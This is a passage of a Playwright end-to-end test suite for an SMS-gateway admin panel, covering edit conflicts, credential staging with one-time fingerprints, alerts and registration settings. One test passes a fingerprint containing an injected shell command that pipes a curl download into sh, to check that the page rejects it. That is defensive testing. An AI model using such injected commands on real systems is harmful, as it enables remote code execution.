      test("limits: while the server is read the form is pending and cannot be edited, and what was sent is what is shown (wp10-r7-2)", async ({page, context, baseURL}) => {
        let hold: Promise<void> | null = null;
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "GET /sms/limits": async () => {
              await hold;
              return {body: limitsFixture()};
            },
            "PUT /sms/limits": (c) => ({body: c.body as ReturnType<typeof limitsFixture>}),
            "POST /auth/totp/fresh": FRESH,
          },
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const cooldown = form.locator('input[name="otp_cooldown_s"]');
        const ip = form.locator('input[name="otp_cap_ip"]');
        const save = form.getByRole("button", {name: A("sms.limits.submit")});
        await cooldown.fill("90");
        await cooldown.blur();
        let release: () => void = () => undefined;
        hold = new Promise<void>((resolve) => (release = resolve));
        await save.click();
        // The read is open: the button is pending and no field takes an edit.
        await expect(save).toHaveAttribute("data-pending", "true");
        await expect(ip).toBeDisabled();
        await expect(cooldown).toBeDisabled();
        expect(mock.count("PUT /sms/limits")).toBe(0);
        release();
        await expect.poll(() => bodies(mock, "PUT", "/sms/limits")).toEqual([limitsFixture({otp_cooldown_s: 90})]);
        await expect(ip).toBeEnabled();
        await expect(save).toBeDisabled();
      });

      test("limits: an edited field another admin changed is a conflict found at Save, and Enter does not get around it (wp10-r6-5)", async ({page, context, baseURL}) => {
        let server = limitsFixture();
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/limits": () => ({body: server}), "PUT /sms/limits": (c) => ({body: c.body as ReturnType<typeof limitsFixture>}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const digits = (n: number) => (lang === "fa" ? String(n).replace(/[0-9]/g, (d) => "۰۱۲۳۴۵۶۷۸۹"[Number(d)]!) : String(n));
        const ip = form.locator('input[name="otp_cap_ip"]');
        const save = form.getByRole("button", {name: A("sms.limits.submit")});
        await ip.fill("60");
        await ip.blur();
        server = limitsFixture({otp_cap_ip: 10});
        await save.click();
        const note = form.getByTestId("conflict-otp_cap_ip");
        await expect(note.getByTestId("conflict-otp_cap_ip-value")).toHaveText(digits(10));
        await expect(ip).toHaveValue(digits(60));
        await expect(save).toBeDisabled();
        await ip.press("Enter");
        expect(mock.count("PUT /sms/limits")).toBe(0);
        await note.getByRole("button", {name: A("conflict.keep")}).click();
        await expect(save).toBeEnabled();
        await save.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/limits")).toEqual([limitsFixture({otp_cap_ip: 60})]);
      });

      test("routing: a primary another admin changed after this one chose theirs is a conflict at Save, and Keep my value then sends the admin's (wp10-r6-1)", async ({page, context, baseURL}) => {
        const off = (g: typeof sms) => ({...g, role: "disabled" as const});
        let items = [off(sms), off(mela), none];
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/gateways": () => ({body: {items}}), "PUT /sms/routing": () => ({body: {items: [{...sms, role: "primary"}, off(mela), none]}}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "routing").click();
        const form = page.getByTestId("sms-routing");
        const save = form.getByRole("button", {name: A("sms.routing.submit")});
        await form.locator("button[aria-haspopup]").first().click();
        await page.getByRole("option", {name: "sms.ir"}).click();
        await expect(save).toBeEnabled();
        // Another admin makes Melipayamak the primary gateway during an outage of sms.ir.
        items = [off(sms), {...mela, role: "primary"}, none];
        await save.click();
        const note = form.getByTestId("conflict-primary");
        await expect(note.getByTestId("conflict-primary-value")).toContainText("Melipayamak");
        await expect(save).toBeDisabled();
        expect(mock.count("PUT /sms/routing")).toBe(0);
        await note.getByRole("button", {name: A("conflict.keep")}).click();
        await expect(note).toHaveCount(0);
        await save.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/routing")).toEqual([{primary: "sms_ir"}]);
      });

      test("routing: a fallback another admin changed is a conflict at Save, and the primary that was not edited follows the server (wp10-r6-1)", async ({page, context, baseURL}) => {
        let items = [sms, mela, none];
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/gateways": () => ({body: {items}}), "PUT /sms/routing": () => ({body: {items}}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "routing").click();
        const form = page.getByTestId("sms-routing");
        const save = form.getByRole("button", {name: A("sms.routing.submit")});
        // The admin swaps the two gateways.
        await form.locator("button[aria-haspopup]").first().click();
        await page.getByRole("option", {name: "Melipayamak"}).click();
        await form.locator("button[aria-haspopup]").nth(1).click();
        await page.getByRole("option", {name: "sms.ir"}).click();
        // Another admin drops the fallback.
        items = [sms, {...mela, role: "disabled"}, none];
        await save.click();
        const note = form.getByTestId("conflict-fallback");
        await expect(note).toBeVisible();
        await expect(form.getByTestId("conflict-primary")).toHaveCount(0);
        await expect(save).toBeDisabled();
        expect(mock.count("PUT /sms/routing")).toBe(0);
        await note.getByRole("button", {name: A("conflict.keep")}).click();
        await save.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/routing")).toEqual([{primary: "melipayamak", fallback: "sms_ir"}]);
      });

      test("templates: a body another admin saved is a conflict at Save, and Keep my value then sends the admin's (wp10-r6-1)", async ({page, context, baseURL}) => {
        let stored = "کد شما {code}";
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "GET /sms/templates": () => ({body: {items: [templateFixture({body: stored})]}}),
            "PUT /sms/templates/{key}/{locale}": (c) => ({body: templateFixture({body: String((c.body as {body: string}).body)})}),
          },
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        const card = page.getByTestId("template-otp-fa");
        const save = card.getByRole("button", {name: A("sms.templates.save"), exact: true});
        await card.locator("textarea").fill("code is {code}");
        stored = "server text {code}";
        await save.click();
        const note = card.getByTestId("conflict-body-otp-fa");
        await expect(note.getByTestId("conflict-body-otp-fa-value")).toHaveText("server text {code}");
        await expect(card.locator("textarea")).toHaveValue("code is {code}");
        await expect(save).toBeDisabled();
        expect(mock.count("PUT /sms/templates/{key}/{locale}")).toBe(0);
        await note.getByRole("button", {name: A("conflict.keep")}).click();
        await expect(save).toBeEnabled();
        await save.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/templates/otp/fa")).toEqual([{body: "code is {code}"}]);
      });

      test("templates: a provider mapping another admin changed is a conflict at Save, for the id and for the names (wp10-r6-1)", async ({page, context, baseURL}) => {
        let mappings: {provider: string; provider_template_id: string; param_names: string[]}[] = [];
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "GET /sms/templates": () => ({body: {items: [templateFixture({mappings})]}}),
            "PUT /sms/gateways/{provider}/templates/{key}/{locale}": () => ({body: templateFixture()}),
            "POST /auth/totp/fresh": FRESH,
          },
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        const mapping = page.getByTestId("template-otp-fa").getByTestId("mapping-melipayamak");
        const save = mapping.getByRole("button", {name: A("sms.templates.saveMapping")});
        await mapping.getByLabel(A("sms.templates.providerId")).fill("987654");
        await mapping.getByLabel(A("sms.templates.paramNames")).fill("code");
        mappings = [{provider: "melipayamak", provider_template_id: "111222", param_names: ["otp"]}];
        await save.click();
        const id = page.getByTestId("conflict-id-otp-fa-melipayamak");
        const names = page.getByTestId("conflict-names-otp-fa-melipayamak");
        await expect(id.getByTestId("conflict-id-otp-fa-melipayamak-value")).toHaveText("111222");
        await expect(names.getByTestId("conflict-names-otp-fa-melipayamak-value")).toHaveText("otp");
        await expect(save).toBeDisabled();
        expect(mock.count("PUT /sms/gateways/{provider}/templates/{key}/{locale}")).toBe(0);
        // One answer is not both: Save waits until each field has its own.
        await id.getByRole("button", {name: A("conflict.keep")}).click();
        await expect(save).toBeDisabled();
        await names.getByRole("button", {name: A("conflict.keep")}).click();
        await expect(save).toBeEnabled();
        await save.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/gateways/melipayamak/templates/otp/fa")).toEqual([{provider_template_id: "987654", param_names: ["code"]}]);
      });

      test("routing: an unpriced primary under a money cap says what is missing, under the primary (wp10-r3-1)", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/routing": err(422, "validation_failed", {fields: [{name: "primary", code: "price_required"}]}), "POST /auth/totp/fresh": FRESH}});
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "routing").click();
        const form = page.getByTestId("sms-routing");
        await form.locator("button[aria-haspopup]").nth(0).click();
        await page.getByRole("option", {name: "Melipayamak"}).click();
        await form.locator("button[aria-haspopup]").nth(1).click();
        await page.getByRole("option", {name: "sms.ir"}).click();
        await form.getByRole("button", {name: A("sms.routing.submit")}).click();
        await expect(form.getByText(adm(lang, "fieldErrors.price_required"))).toBeVisible();
        await expect(form.getByText(errText(lang, "fields.invalid"), {exact: true})).toHaveCount(0);
      });

      test("stats: a KPI row of totals and the two tables, with no chart", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: base});
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "stats").click();
        const stats = page.getByTestId("sms-stats");
        await expect(stats.getByTestId("kpi-otp")).toContainText(lang === "fa" ? "۲۱۸" : "218");
        await expect(stats.getByRole("grid", {name: A("sms.stats.perDay")}).getByRole("row")).toHaveCount(3);
        await expect(stats.getByRole("grid", {name: A("sms.stats.perGateway")}).getByRole("row")).toHaveCount(3);
        await expect(stats.locator("svg.recharts-surface")).toHaveCount(0);
      });

      test("acknowledge: a write that needs a fresh code opens the dialog and is repeated once (gate-r32-3)", async ({page, context, baseURL}) => {
        let n = 0;
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "POST /alerts/{id}/ack": () => (++n === 1 ? err(403, "totp_fresh_required") : {status: 204}), "POST /auth/totp/fresh": FRESH},
          alerts: [alertFixture({id: "30000000-0000-4000-8000-0000000000c2", severity: "warning", params: {provider: "sms_ir", class: "credit", code: "no_credit"}})],
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("sms-alerts").getByRole("button", {name: A("sms.alerts.ack")}).click();
        await expect(page.getByRole("dialog", {name: A("fresh.title")})).toBeVisible();
        mock.alerts.current = [];
        await typeCode(page, "totp_code", CODE);
        await expect.poll(() => mock.calls.filter((c) => c.method === "POST" && c.path.endsWith("/ack")).length).toBe(2);
      });

      // gate-r32-4. New credentials wait for ctrlz-admin sms confirm at the console (D64): the card says so, and the save toast does too.
      test("a gateway with new credentials waiting for the owner says so, and a credentials save says they are not active yet (gate-r32-4)", async ({page, context, baseURL}) => {
        const waiting = {...gatewayFixture({provider: "sms_ir", role: "primary"}), pending_confirmation: true};
        await openAdmin(context, baseURL, {handlers: {...base, "GET /sms/gateways": {body: {items: [waiting, mela, none]}}, "PUT /sms/gateways/{provider}": {body: waiting}}});
        await goto(page, "/sms", A("pages.sms.title"));
        const card = page.getByTestId("gateway-sms_ir");
        await expect(card.getByTestId("gateway-pending")).toContainText(A("sms.gateways.pending"));
        await expect(card.getByTestId("gateway-pending-text").locator("bdi")).toHaveText("ctrlz-admin sms pending");
        // The card never carries a fingerprint: only the response of the PUT that staged the pair has it (admin-r21-5).
        await expect(card.getByTestId("gateway-pending-text")).not.toContainText("--fingerprint");
        await expect(page.getByTestId("gateway-melipayamak").getByTestId("gateway-pending")).toHaveCount(0);
        await card.getByRole("button", {name: A("sms.gateways.edit")}).click();
        await page.locator('input[name="gw_sms_ir_api_key"]').fill("fixture-key-value");
        await page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})}).getByRole("button", {name: A("sms.edit.submit")}).click();
        await expect(page.getByText(A("sms.edit.savedPending"))).toBeVisible();
      });

      // P1 web merge, merge-r2-15 and merge-r2-20 (admin-r21-5 of the auth review). The PUT that stages a pair is the only response with
      // pending_fingerprint, and `ctrlz-admin sms confirm` needs it, so a page that drops it leaves the owner with a pair no one can confirm.
      // The case fails when the response is dropped: no dialog, no fingerprint.
      test("a credentials save shows the fingerprint of the staged pair once, in a panel that asks before it closes, and keeps it out of the page afterwards", async ({page, context, baseURL}) => {
        const FINGERPRINT = "0123456789abcdef";
        const waiting = {...gatewayFixture({provider: "sms_ir", role: "primary"}), pending_confirmation: true};
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/gateways": {body: {items: [waiting, mela, none]}}, "PUT /sms/gateways/{provider}": {body: {...waiting, pending_fingerprint: FINGERPRINT}}},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const edit = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        await edit.locator('input[name="gw_sms_ir_api_key"]').fill("fixture-key-value");
        await edit.getByRole("button", {name: A("sms.edit.submit")}).click();

        const result = page.getByRole("dialog", {name: A("sms.gateways.staged.title")});
        await expect(result).toBeVisible();
        const line = `ctrlz-admin sms confirm sms_ir --hint H --fingerprint ${FINGERPRINT}`;
        await expect(result.getByTestId("one-time-sms-confirm")).toHaveText(line);
        await expect(result.getByRole("button", {name: A("sms.gateways.staged.copy")})).toBeVisible();
        // The fingerprint is on no toast, no address, and not in the gateways list that the page reads again.
        expect(page.url()).not.toContain(FINGERPRINT);
        // The own keys of both storages and the session history entry: the guard of the panel copies history.state into the entry it pushes (merge-r3-16).
        const kept = () => page.evaluate(() => JSON.stringify([Object.entries(localStorage), Object.entries(sessionStorage), window.history.state]));
        expect(await kept()).not.toContain(FINGERPRINT);
        // Done without having copied it asks first: the value cannot be shown again.
        await result.getByRole("button", {name: C("done")}).click();
        // The save toast is an alertdialog too, so the question is found by its name.
        const confirm = page.getByRole("alertdialog", {name: A("result.confirmTitle")});
        await expect(confirm).toBeVisible();
        await confirm.getByRole("button", {name: A("result.keep")}).click();
        await expect(result.getByTestId("one-time-sms-confirm")).toBeVisible();
        await page.getByRole("checkbox", {name: A("result.saved")}).locator("xpath=ancestor::label").click();
        await result.getByRole("button", {name: C("done")}).click();
        await expect(result).toHaveCount(0);
        expect(await page.content()).not.toContain(FINGERPRINT);
        // And once the panel has closed and its history entry is taken back.
        expect(await kept()).not.toContain(FINGERPRINT);
        expect(mock.calls.filter((c) => c.method === "GET" && c.path === "/sms/gateways").length).toBeGreaterThan(0);
      });

      test("a credentials save whose response has no fingerprint opens no panel (a pair this session did not stage)", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/gateways/{provider}": {body: sms}}});
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const edit = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        await edit.locator('input[name="gw_sms_ir_api_key"]').fill("fixture-key-value");
        await edit.getByRole("button", {name: A("sms.edit.submit")}).click();
        await expect(edit).toHaveCount(0);
        await expect(page.getByRole("dialog", {name: A("sms.gateways.staged.title")})).toHaveCount(0);
      });

      // merge-r3-14. The fingerprint ends in a shell line that the owner copies at the server, and the answer comes from another process: a value that
      // is not 16 hex digits is never put into that line. The owner is told the pair cannot be confirmed instead.
      test("a fingerprint that is not 16 hex digits opens no panel and is in no part of the page, and the owner is told (merge-r3-14)", async ({page, context, baseURL}) => {
        const BAD = "0123456789abcdef; curl http://x | sh";
        const waiting = {...gatewayFixture({provider: "sms_ir", role: "primary"}), pending_confirmation: true};
        await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/gateways": {body: {items: [waiting, mela, none]}}, "PUT /sms/gateways/{provider}": {body: {...waiting, pending_fingerprint: BAD}}},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const edit = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        await edit.locator('input[name="gw_sms_ir_api_key"]').fill("fixture-key-value");
        await edit.getByRole("button", {name: A("sms.edit.submit")}).click();
        await expect(page.getByText(A("sms.edit.noFingerprint"))).toBeVisible();
        await expect(page.getByRole("dialog", {name: A("sms.gateways.staged.title")})).toHaveCount(0);
        expect(await page.content()).not.toContain("curl");
      });

      // merge-r3-13, the same as gate-r32-6 for the credentials dialog: the PUT that stages a pair answers with a fingerprint that cannot be asked for again.
      test("credentials save: Back and Escape do not drop the dialog while the PUT runs, and the fingerprint is shown when it answers (merge-r3-13)", async ({page, context, baseURL}) => {
        const FINGERPRINT = "fedcba9876543210";
        let release: () => void = () => undefined;
        const gate = new Promise<void>((resolve) => (release = resolve));
        let sent = false;
        const waiting = {...gatewayFixture({provider: "sms_ir", role: "primary"}), pending_confirmation: true};
        await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "GET /sms/gateways": {body: {items: [waiting, mela, none]}},
            "PUT /sms/gateways/{provider}": async () => {
              sent = true;
              await gate;
              return {status: 200, body: {...waiting, pending_fingerprint: FINGERPRINT}};
            },
          },
        });
        try {
          await goto(page, "/sms", A("pages.sms.title"));
          await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
          const edit = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
          await edit.locator('input[name="gw_sms_ir_api_key"]').fill("fixture-key-value");
          await edit.getByRole("button", {name: A("sms.edit.submit")}).click();
          await expect.poll(() => sent).toBe(true);
          for (let i = 0; i < 2; i++) await page.evaluate(() => window.history.back());
          await page.keyboard.press("Escape");
          await expect(edit).toBeVisible();
          expect(url(page).pathname).toBe(`/${lang}/sms`);
        } finally {
          release();
        }
        await expect(page.getByTestId("one-time-sms-confirm")).toContainText(FINGERPRINT);
        // The lock was for the call: Escape closes the next dialog again (gate-r33-12).
        await page.getByRole("dialog", {name: A("sms.gateways.staged.title")}).getByRole("checkbox", {name: A("result.saved")}).locator("xpath=ancestor::label").click();
        await page.getByRole("dialog", {name: A("sms.gateways.staged.title")}).getByRole("button", {name: C("done")}).click();
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        await page.keyboard.press("Escape");
        await expect(page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})})).toHaveCount(0);
      });

      // merge-r3-13, the same as gate-r32-7: a failure after which the server may have staged the pair says so, and offers no Retry, which would meet pending_exists.
      test("credentials save: a failure that may have lost the answer says a pair may be waiting, with no Retry (merge-r3-13)", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/gateways/{provider}": err(500, "internal")}});
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const edit = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        await edit.locator('input[name="gw_sms_ir_api_key"]').fill("fixture-key-value");
        const before = mock.calls.filter((c) => c.path === "/sms/gateways" && c.method === "GET").length;
        await edit.getByRole("button", {name: A("sms.edit.submit")}).click();
        await expect(edit.getByTestId("gateway-save-lost")).toContainText(A("sms.edit.lost", {pending: "ctrlz-admin sms pending", discard: "ctrlz-admin sms discard"}));
        await expect(edit.getByRole("button", {name: C("retry")})).toHaveCount(0);
        await expect.poll(() => mock.calls.filter((c) => c.path === "/sms/gateways" && c.method === "GET").length).toBeGreaterThan(before);
      });

      // P1 web merge, B4: main answers 422 validation_failed with fields [{name: "credentials", code: "pending_exists"}] when a pair already waits for
      // the console (PutSmsGateway, db-r19-2). The page has no field of that name, so the line used to be the bare "validation failed" of the form.
      test("a credentials save while a pair already waits for the console says so under the first credential field", async ({page, context, baseURL}) => {
        const waiting = {...gatewayFixture({provider: "sms_ir", role: "primary"}), pending_confirmation: true};
        await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/gateways": {body: {items: [waiting, mela, none]}}, "PUT /sms/gateways/{provider}": err(422, "validation_failed", {fields: [{name: "credentials", code: "pending_exists"}]})},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        await dialog.locator('input[name="gw_sms_ir_api_key"]').fill("fixture-key-value");
        await dialog.getByRole("button", {name: A("sms.edit.submit")}).click();
        await expect(dialog.getByText(A("fieldErrors.pending_exists"))).toBeVisible();
        await expect(dialog.locator('input[name="gw_sms_ir_api_key"]')).toHaveAttribute("aria-invalid", "true");
      });

      test("unresolved SMS alerts sit above the tabs with an acknowledge button", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "POST /alerts/{id}/ack": {status: 204}},
          alerts: [alertFixture({id: "30000000-0000-4000-8000-0000000000c1", severity: "critical", params: {provider: "sms_ir", class: "credit", code: "no_credit"}})],
        });
        await goto(page, "/sms", A("pages.sms.title"));
        const alerts = page.getByTestId("sms-alerts");
        await expect(alerts).toContainText("sms.ir");
        await expect(alerts).toContainText(A("alerts.sms_gateway.credit"));
        await expect(alerts.locator("bdi", {hasText: "no_credit"})).toBeVisible();
        mock.alerts.current = [];
        await alerts.getByRole("button", {name: A("sms.alerts.ack")}).click();
        await expect.poll(() => mock.calls.filter((c) => c.method === "POST" && c.path.endsWith("/ack")).map((c) => c.path)).toContain("/alerts/30000000-0000-4000-8000-0000000000c1/ack");
        await expect(alerts).toHaveCount(0);
      });
    });

    // ---- Settings -------------------------------------------------------------------------------------------------

    test.describe("settings", () => {
      const reg = (mode: string, grace = 0) => ({body: {mode, open_grace_days: grace, takeover_idle_days: 30}});
      const rest = {
        "GET /settings/webauthn": {body: {rp_id: "panel.example.ir", allowed_origins: ["https://panel.example.ir"], enabled: false}},
        "POST /auth/totp/fresh": FRESH,
      } as const;

      test("picking a mode shows what it would do before anything is written", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...rest, "GET /settings/registration": reg("invite"), "GET /settings/registration/impact": (c) => ({body: {graced: c.query.get("to") === "open" ? 12 : 0, suspended_at_once: 3}})}});
        await goto(page, "/settings", A("pages.settings.title"));
        await page.getByRole("radio", {name: A("settings.registration.mode.open")}).click();
        const impact = page.getByTestId("registration-impact");
        await expect(impact.getByTestId("impact-graced")).toContainText(lang === "fa" ? "۱۲" : "12");
        await expect(impact.getByTestId("impact-suspended")).toContainText(lang === "fa" ? "۳" : "3");
        // Nothing was written yet, and the impact was asked for the mode that was picked.
        expect(mock.count("PUT /settings/registration")).toBe(0);
        expect(mock.calls.some((c) => c.path === "/settings/registration/impact" && c.query.get("to") === "open")).toBe(true);
      });

      // wp10-r20-2. The impact is what the admin must read before confirming. A polite live region inserted already holding its text is
      // often not spoken, so each panel's status container must be in the page empty, and its text must arrive as a change.
      test("the impact panels are status regions that are inserted empty and filled after (wp10-r20-2)", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/registration": reg("invite"),
            "GET /settings/registration/impact": {body: {graced: 12, suspended_at_once: 3}},
            "GET /settings/webauthn/impact": {body: {credentials: 4, users: 3, enforced_users: 1}},
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        // The text each panel held at the moment it entered the page.
        // wp10-r21-1: and whether it was exposed to assistive technology while empty. A display:none element is not in the accessibility
        // tree, so the region and its text would arrive together. Not display:none, not visibility:hidden, and it has a box.
        await page.evaluate(() => {
          const seen: Record<string, string> = {};
          const exposed: Record<string, string> = {};
          (window as unknown as {__impactAtInsert: Record<string, string>}).__impactAtInsert = seen;
          (window as unknown as {__impactExposed: Record<string, string>}).__impactExposed = exposed;
          const look = (node: Node) => {
            if (!(node instanceof Element)) return;
            for (const el of [node, ...node.querySelectorAll("[data-testid]")]) {
              const id = el.getAttribute("data-testid");
              if (id === "registration-impact" || id === "webauthn-impact") {
                seen[id] ??= el.textContent ?? "";
                const style = getComputedStyle(el);
                exposed[id] ??= [style.display, style.visibility, el.getClientRects().length > 0 ? "box" : "no-box"].join(" ");
              }
            }
          };
          new MutationObserver((records) => records.forEach((r) => r.addedNodes.forEach(look))).observe(document.body, {childList: true, subtree: true});
        });
        await page.getByRole("radio", {name: A("settings.registration.mode.open")}).click();
        await page.locator('input[name="rp_id"]').fill("example.ir");
        const registration = page.getByTestId("registration-impact");
        const passkey = page.getByTestId("webauthn-impact");
        for (const panel of [registration, passkey]) {
          await expect(panel).toHaveAttribute("role", "status");
          await expect(panel).toHaveAttribute("aria-live", "polite");
        }
        await expect(registration.getByTestId("impact-graced")).toBeVisible();
        await expect(passkey.getByTestId("impact-credentials")).toBeVisible();
        const atInsert = await page.evaluate(() => (window as unknown as {__impactAtInsert: Record<string, string>}).__impactAtInsert);
        expect(atInsert["registration-impact"]).toBe("");
        expect(atInsert["webauthn-impact"]).toBe("");
        const exposed = await page.evaluate(() => (window as unknown as {__impactExposed: Record<string, string>}).__impactExposed);
        for (const id of ["registration-impact", "webauthn-impact"]) {
          const [display, visibility, box] = (exposed[id] ?? "").split(" ");
          expect(display, id).not.toBe("none");
          expect(visibility, id).toBe("visible");
          expect(box, id).toBe("box");
        }
      });

      test("open asks for the grace days inside the API's bounds, and the write carries them", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...rest, "GET /settings/registration": reg("invite"), "GET /settings/registration/impact": {body: {graced: 1, suspended_at_once: 0}}, "PUT /settings/registration": reg("open", 14)}});
        await goto(page, "/settings", A("pages.settings.title"));
        await page.getByRole("radio", {name: A("settings.registration.mode.open")}).click();
        const days = page.getByRole("textbox", {name: A("settings.registration.grace")});
        await days.fill("500");
        await days.blur();
        await expect(days).toHaveValue(lang === "fa" ? "۳۶۵" : "365");
        await days.fill("");
        await days.blur();
        await page.getByRole("button", {name: A("settings.registration.confirm", {mode: A("settings.registration.mode.open")})}).click();
        expect(mock.count("PUT /settings/registration")).toBe(0);
        await days.fill("14");
        await days.blur();
        await page.getByRole("button", {name: A("settings.registration.confirm", {mode: A("settings.registration.mode.open")})}).click();
        await expect.poll(() => bodies(mock, "PUT", "/settings/registration")).toEqual([{mode: "open", open_grace_days: 14}]);
        await expect(page.getByTestId("registration-draft")).toHaveCount(0);
      });

      test("the confirm button waits for the numbers, and a failed count is said", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: {...rest, "GET /settings/registration": reg("invite"), "GET /settings/registration/impact": err(503, "service_unavailable")}});
        await goto(page, "/settings", A("pages.settings.title"));
        await page.getByRole("radio", {name: A("settings.registration.mode.closed")}).click();
        await expect(page.getByTestId("registration-impact")).toContainText(A("settings.impactFailed"));
        await expect(page.getByRole("button", {name: A("settings.registration.confirm", {mode: A("settings.registration.mode.closed")})})).toBeDisabled();
      });

      test("a failed count has Retry, and the confirm button opens when the second ask answers", async ({page, context, baseURL}) => {
        let up = false;
        await openAdmin(context, baseURL, {
          handlers: {...rest, "GET /settings/registration": reg("invite"), "GET /settings/registration/impact": () => (up ? {body: {graced: 2, suspended_at_once: 1}} : err(503, "service_unavailable"))},
        });
        await goto(page, "/settings", A("pages.settings.title"));
        await page.getByRole("radio", {name: A("settings.registration.mode.closed")}).click();
        const impact = page.getByTestId("registration-impact");
        await expect(impact).toContainText(A("settings.impactFailed"));
        const confirm = page.getByRole("button", {name: A("settings.registration.confirm", {mode: A("settings.registration.mode.closed")})});
        await expect(confirm).toBeDisabled();
        up = true;
        await impact.getByRole("button", {name: C("retry")}).click();
        await expect(impact.getByTestId("impact-graced")).toBeVisible();
        await expect(confirm).toBeEnabled();
      });

      test("passkey: a failed count has Retry, and a malformed RP ID is said to be malformed, not uncounted", async ({page, context, baseURL}) => {
        let up = false;
        await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/registration": reg("invite"),
            "GET /settings/webauthn/impact": (c) => (c.query.get("rp_id") === "panel example" ? err(422, "validation_failed", {fields: [{name: "rp_id", code: "invalid"}]}) : up ? {body: {credentials: 1, users: 1, enforced_users: 0}} : err(503, "service_unavailable")),
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        const field = card.locator('input[name="rp_id"]');
        await field.fill("example.ir");
        await expect(card.getByTestId("impact-failed")).toBeVisible();
        up = true;
        await card.getByTestId("impact-failed").getByRole("button", {name: C("retry")}).click();
        await expect(card.getByTestId("impact-credentials")).toBeVisible();
        await expect(card.getByRole("button", {name: A("settings.webauthn.submit")})).toBeEnabled();
        // wp10-r1-3: the value is wrong, so the field says so and there is nothing to retry.
        await field.fill("panel example");
        await expect(card.getByText(A("settings.webauthn.rpMalformed"))).toBeVisible();
        await expect(field).toHaveAttribute("aria-invalid", "true");
        await expect(card.getByTestId("impact-failed")).toHaveCount(0);
        await expect(card.getByText(A("settings.impactFailed"))).toHaveCount(0);
        await expect(card.getByRole("button", {name: A("settings.webauthn.submit")})).toBeDisabled();
      });

      test("passkey: a PUT refused as rp_id:invalid says what a valid RP ID is, not the shared \"not valid\" line (wp10-r19-1)", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/registration": reg("invite"),
            "GET /settings/webauthn/impact": {body: {credentials: 1, users: 1, enforced_users: 0}},
            "PUT /settings/webauthn": err(422, "validation_failed", {fields: [{name: "rp_id", code: "invalid"}]}),
            "POST /auth/totp/fresh": FRESH,
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        const field = card.locator('input[name="rp_id"]');
        await field.fill("example.ir");
        await expect(card.getByTestId("impact-credentials")).toBeVisible();
        await card.getByRole("button", {name: A("settings.webauthn.submit")}).click();
